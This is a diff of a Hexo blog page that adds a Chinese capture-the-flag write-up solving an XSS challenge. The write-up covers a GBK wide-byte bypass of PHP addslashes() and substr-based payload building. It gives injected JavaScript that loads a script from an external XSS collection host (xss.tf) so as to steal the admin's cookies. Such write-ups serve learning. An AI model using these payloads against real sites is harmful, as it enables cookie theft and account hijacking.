@@ -6,19 +6,31 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://kkkiona.github.io">
-  <title>Kiona</title>
+  <title>XSS 题目解析（下篇） | Kiona</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Information Security">
+  <meta name="description" content="第三题：XSS 2 一样的题目，只不过xss.php文件不一样，直接点进去看看。这个页面你输入什么东西都会被转换成字符串无论是”、&amp;lt;、&amp;gt; 还是Unicode编码。可以发现敏感字符被转义了，Unicode被原样变换成了纯字符。 刚开始会有种手足无措的感觉，因为无论编码还是构造错误语法都没法突破。我决定按部就班从源头入手。先来搞清楚出题者是怎么实现这个转换功能的。既然是php文件我认为这个">
 <meta name="keywords" content="Web Security">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Kiona">
-<meta property="og:url" content="https://kkkiona.github.io/page/2/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS 题目解析（下篇）">
+<meta property="og:url" content="https://kkkiona.github.io/2019/04/09/XSS 题目解析 （下篇）/index.html">
 <meta property="og:site_name" content="Kiona">
-<meta property="og:description" content="Information Security">
+<meta property="og:description" content="第三题：XSS 2 一样的题目，只不过xss.php文件不一样，直接点进去看看。这个页面你输入什么东西都会被转换成字符串无论是”、&amp;lt;、&amp;gt; 还是Unicode编码。可以发现敏感字符被转义了，Unicode被原样变换成了纯字符。 刚开始会有种手足无措的感觉，因为无论编码还是构造错误语法都没法突破。我决定按部就班从源头入手。先来搞清楚出题者是怎么实现这个转换功能的。既然是php文件我认为这个">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190409133601270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190409133842466.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190409134026221.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190409150656781.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190409150917138.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190409151309137.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190409151436333.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190409151957595.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190409152007965.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190409152431289.png">
+<meta property="og:updated_time" content="2019-04-09T07:41:40.282Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Kiona">
-<meta name="twitter:description" content="Information Security">
+<meta name="twitter:title" content="XSS 题目解析（下篇）">
+<meta name="twitter:description" content="第三题：XSS 2 一样的题目，只不过xss.php文件不一样，直接点进去看看。这个页面你输入什么东西都会被转换成字符串无论是”、&amp;lt;、&amp;gt; 还是Unicode编码。可以发现敏感字符被转义了，Unicode被原样变换成了纯字符。 刚开始会有种手足无措的感觉，因为无论编码还是构造错误语法都没法突破。我决定按部就班从源头入手。先来搞清楚出题者是怎么实现这个转换功能的。既然是php文件我认为这个">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190409133601270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70">
   
     <link rel="alternative" href="/atom.xml" title="Kiona" type="application/atom+xml">
   
@@ -157,62 +169,145 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-first blog" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-XSS 题目解析 （下篇）" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/04/03/first blog/">First Article</a>
+    <h1 class="article-title" itemprop="name">
+      XSS 题目解析（下篇）
     </h1>
   
 
         
-        <a href="/2019/04/03/first blog/" class="archive-article-date">
-  	<time datetime="2019-04-03T12:24:54.992Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-03</time>
+        <a href="/2019/04/09/XSS 题目解析 （下篇）/" class="archive-article-date">
+  	<time datetime="2019-04-09T07:40:46.039Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>早上看了一下之前的Github实在是不忍直视<br><img src="https://img-blog.csdnimg.cn/20190403201220137.jpg" alt="在这里插入图片描述"><br>还是重新制作一个吧。<br>使用的是hexo搭建的博客，步骤比较简单。但是在themes选择上真的是强迫症患者的噩梦<img src="https://img-blog.csdnimg.cn/2019040320150486.jpg" alt="在这里插入图片描述">。<br>偏偏就喜欢上了一个已经停止维护的yilia主题，尝试了无数次修改buffer大小之后依然无法使用HTTP下载，还是ssh吧。<br>下载下来之后更是bug一大堆，比如tag。修改了半天总算是基本正常了。</p>
-<p>既然是新做的博客必须好好搞一下，从网易云拉了音乐，另外搞了一下午的图灵机器人，而且失败了。<img src="https://img-blog.csdnimg.cn/2019040320150486.jpg" alt="在这里插入图片描述">。其实hexo 是自带Live2D功能的，但是想做一个高大上的带交友功能的机器人。然而node.js不熟悉挂接图灵接口的时候就是不行，最后无奈先用自带的吧。明天开始研究信息安全。有时间再搞图灵。。<img src="https://img-blog.csdnimg.cn/2019040320224889.gif" alt="在这里插入图片描述"></p>
+        <p><strong>第三题：XSS 2</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/20190409133601270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一样的题目，只不过xss.php文件不一样，直接点进去看看。<br><img src="https://img-blog.csdnimg.cn/20190409133842466.png" alt="在这里插入图片描述"><br>这个页面你输入什么东西都会被转换成字符串无论是”、&lt;、&gt; 还是Unicode编码。<br><img src="https://img-blog.csdnimg.cn/20190409134026221.png" alt="在这里插入图片描述"><br>可以发现敏感字符被转义了，Unicode被原样变换成了纯字符。</p>
+<p>刚开始会有种手足无措的感觉，因为无论编码还是构造错误语法都没法突破。我决定按部就班从源头入手。<br>先来搞清楚出题者是怎么实现这个转换功能的。既然是php文件我认为这个转换也是依靠的php。果然php中的addslashes()方法会把内容无脑转成字符串从而让恶意代码失效。那么就可以查阅一下怎样绕过addslashes()了。这里我只说一下本题的解法，各种绕过姿势详见<a href="https://bbs.ichunqiu.com/thread-10899-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-10899-1-1.html</a><br><a id="more"></a><br>我这里是用的是宽字节方法，简单说一下就是“錦“字gbk编码是0xe55c，utf-8编码是0xe98ca6。当php的iconv把它从UTF-8转成gbk的时候会被翻译为%e5%5c，而%5c就是“\”，当我们输入“\” 是iconv会把它转成转义字符 “\” 编码是%5c%5c ，那么如果这么输入“錦\”，iconv 便把它转换成了 %e5%5c%5c%5c,也就是“閷�\”,可以看到最后的\逃出来了，输入“ 錦” ”，输出“閷””.OK,成功闭合。这种方法类似于SQL注入。</p>
+<p>但是我们还面临一个问题，如果我们按照之前的方法使用createElement()的方法的话我们必然会用到 ‘ ，但是会被转义，如果用汉字破坏转义又会留有乱码，createElement(閷�’閷�’).显然这是不正确的语法。</p>
+<p>接下来的方法比较笨拙仅仅是我个人的做法，希望读者能找出更好地做法。为了大家方便实现提示一下，这个页面除了做了字符串转换以外，还过滤掉了“&lt;”和“+”这两个符号，以防大家白费功夫。不过如果你的思路实在需要这些符号后面我也会说一下如何提取这些符号。</p>
+<p>我想到的办法是反利用它原本的的字符串转换。我们很清楚我们需要</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var s=document.createElement(&apos;script&apos;);</span><br><span class="line">document.body.appendChild(s);</span><br><span class="line">s.src=&quot;http://xss.tf/Vw6&quot;;</span><br></pre></td></tr></table></figure>
+<p>这段代码，但是这段代码，需要两个字符串，一个是标签名一个是地址名。恰好我们手里有一个现成的字符串变量<strong>a</strong>，没错，我的想法就是把要用到的字符串写到a变量里面然后截取。输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scripthttp://xss.tf/Vw6錦&quot;;//</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190409150656781.png" alt="在这里插入图片描述"><br>变量a里面已经写入了我们需要的代码，我们需要提取出来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">scripthttp://xss.tf/Vw6錦&quot;;</span><br><span class="line">var s=document.createElement(a.substr(0,6));</span><br><span class="line">document.body.appendChild(s);</span><br><span class="line">s.src=a.substr(6,17);</span><br><span class="line">//</span><br></pre></td></tr></table></figure>
+<p>通过substr()将需要的字符串截取了出来。提交一下看看。<br><img src="https://img-blog.csdnimg.cn/20190409150917138.png" alt="在这里插入图片描述"><br>完成。想必你的XSS平台也已经提示你了。</p>
+<p>接下来只需要把它放到URL里面让admin上钩即可。但是这里还是要把他们转换成<strong>encodeURIComponent</strong>（这里只需转一次，不用先转Unicode）。因为题目指定URL不允许使用汉字空格等。<br><img src="https://img-blog.csdnimg.cn/20190409151309137.png" alt="在这里插入图片描述"><br>最后提交完成。<br><img src="https://img-blog.csdnimg.cn/20190409151436333.png" alt="在这里插入图片描述"><br>最后附上如何强行使用被过滤的符号，拿 &lt; 来说，我的思路依然是使用 a 字符串变量。<br>&lt; 的 encodeURIComponent 编码是%3c。也就是浏览器会把%3c解释为 &lt; 。那么我的思路就是不让浏览器解释我们自己来。我们再对%3c进行encodeURIComponent 编码得到%253c。我们把这个代码给URL看看会发生什么。<br><img src="https://img-blog.csdnimg.cn/20190409151957595.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20190409152007965.png" alt="在这里插入图片描述"><br>得到了 %3c没有问题。接下来就需要我们自己转码了。同样使用substr()截取到%3c然后用decodeURI() 函数解码。小示范：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%253c錦&quot;;</span><br><span class="line">alert(decodeURI(a.substr(0,3)));</span><br><span class="line">//</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190409152431289.png" alt="在这里插入图片描述"></p>
+<p><strong>总结</strong></p>
+<p>先说几点提示：<br>1、除了使用createElement()还可以用document.write()。但是后者的写入方式很迷，有时候会把你的数据当做字符串处理，而且需要用到转义字符，因为你的内容里面一定会有 ‘ 等标记部转译的话会发生错误。<br>2、XSS平台提供了很多注入方式，比如构造图片等等，但是图片方式的载入速度要慢一些。有可能会失败，比如再做后两道题的时候，第一道使用图片完全没有问题，但是第二道却不行。并且第一道题在使用图片注入的时候，你并不能立即获得报告，你需要再随便点一次提交才可以获得报告，我猜想是，第一次admin把脚本给了xss.php但是图片并没有加载，再次提交的时候刚才能让图片载入。但是第二道题就完全不可以了。这个问题我需要在研究一下。<br>3、如果你是用的是XSS Hunter做题的话，可能会因为延迟的问题导致你获取不到admin的cookies。因为它的服务器在海外，所以对js的访问速度要慢一些，可能会导致你抓包里面的内容不全。另外它的模块设置了如果你之前有它发送的邮件，它会自动把老邮件扔到垃圾箱，只保留最新的邮件。有一次因为漏写了 ; 导致代码反复运行发了50多封邮件给我，只能一个个查找哪个是admin发给我的。</p>
+<p>总的来说XSS有点类似SQL注入，只不过这里用的是HTML、JS。虽然只是学习了初级阶段的内容但是还是非常有意思的。</p>
 
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
+      
 
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/04/03/first blog/">展开全文 >></a>
-        </p>
-      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
 
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://kkkiona.github.io/2019/04/09/XSS 题目解析 （下篇）/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2019/04/09/XSS 题目解析（上篇）/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -232,83 +327,14 @@
 
 
 
-
-  
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/04/03/hello-world/">Hello World</a>
-    </h1>
-  
-
-        
-        <a href="/2019/04/03/hello-world/" class="archive-article-date">
-  	<time datetime="2019-04-03T03:37:59.399Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-03</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/04/03/hello-world/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -331,8 +357,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
